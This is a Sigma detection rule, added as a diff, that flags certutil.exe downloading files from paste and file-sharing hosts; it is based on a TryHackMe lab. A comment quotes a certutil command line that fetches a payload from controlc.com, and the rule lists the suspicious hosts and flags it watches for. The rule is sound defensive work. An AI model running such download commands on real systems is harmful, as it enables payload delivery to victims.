@@ -1,0 +1,67 @@
+title: Suspicious Certutil Download From Paste / File-Sharing Host
+id: 8f2b1c74-3d3a-4a1e-9b7d-0c5a1e2f4d10
+status: experimental
+description: >
+  Detects certutil.exe used as a download client (URL cache retrieval) to pull
+  an object from a third-party paste or file-sharing host. Modelled on the
+  TryHackMe "Benign" room, where certutil.exe fetched a payload from
+  controlc.com during post-exploitation.
+references:
+  - https://tryhackme.com/room/benign
+  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
+author: Benign THM write-up (illustrative, lab-only)
+date: 2022/03/04
+tags:
+  - attack.command_and_control
+  - attack.t1105
+  - attack.resource_development
+  - attack.t1608
+  - attack.defense_evasion
+  - attack.t1218
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_img:
+    - Image|endswith: '\certutil.exe'
+    - OriginalFileName: 'CertUtil.exe'
+  selection_flags:
+    CommandLine|contains:
+      - '-urlcache'
+      - '/urlcache'
+      - '-verifyctl'
+      - '-split'
+  selection_remote:
+    CommandLine|contains:
+      - ' http://'
+      - ' https://'
+      - ' http[:]//'
+      - ' https[:]//'
+  selection_susp_hosts:
+    CommandLine|contains:
+      - 'controlc.com'
+      - 'pastebin.com'
+      - 'paste.ee'
+      - 'transfer.sh'
+      - 'anonfiles.com'
+      - 'gofile.io'
+      - 'discord.com/api/webhooks'
+      - 'raw.githubusercontent.com'
+  condition: selection_img and ((selection_flags and selection_remote) or selection_susp_hosts)
+falsepositives:
+  - Legitimate PKI / certificate administration fetching CRLs or certificates over HTTP(S)
+  - Software installers that use certutil for certificate bootstrapping
+level: high
+
+# Notes
+#
+# * The room's observed command line:
+#
+#   certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
+#
+# * `-urlcache` with a URL argument is the strongest single signal. Pair it with
+#   the remote-URL test to cut noise, or use `selection_susp_hosts` alone if your
+#   environment never legitimately reaches paste sites.
+# * Tune `selection_susp_hosts` against your egress policy: many organisations
+#   treat paste-bin downloads as forbidden outright, in which case the host list
+#   alone is sufficient.
